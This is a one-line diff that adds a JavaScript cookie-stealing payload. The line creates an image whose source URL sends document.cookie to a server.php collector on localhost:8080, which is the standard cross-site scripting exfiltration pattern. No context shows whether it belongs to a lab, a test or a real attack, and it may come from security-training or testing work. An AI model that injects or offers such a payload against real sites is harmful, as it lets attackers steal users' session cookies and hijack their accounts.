@@ -1,0 +1,1 @@
+new Image().src='http://localhost:8080/server.php?c='+document.cookie
